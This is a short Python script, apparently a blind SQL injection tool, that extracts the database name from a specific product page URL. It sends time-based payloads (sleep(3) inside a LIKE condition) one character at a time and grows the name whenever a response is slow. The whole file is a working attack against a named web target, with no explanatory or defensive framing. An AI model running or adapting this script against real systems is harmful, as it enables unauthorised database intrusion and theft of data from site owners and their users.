import requests
import sys

url = "http://coda.cc/product/product.php?id="

chars = "abcdefghijklmnopqrstuvwxyz0123456789_@."

database_name = ""

payload= "4 and if(exists(select * from dual where database() like '{}%'),sleep(3),false) -- -".format(database_name)

temp = "abc"
while temp != database_name:
    temp = database_name
    for i in chars:
        payload = "4 and if(exists(select * from dual where database() like '{}%'),sleep(3),false) -- -".format(database_name + i)
        res = requests.get(url+payload)
        print ("[*] Try to payload: "+ payload)
        if res.elapsed.total_seconds() > 3:
            database_name = database_name + i
            payload= "4 and if(exists(select * from dual where database() like '{}%'),sleep(3),0) -- -".format(database_name)
            print(database_name)
            break
print ("Database name: " + database_name)

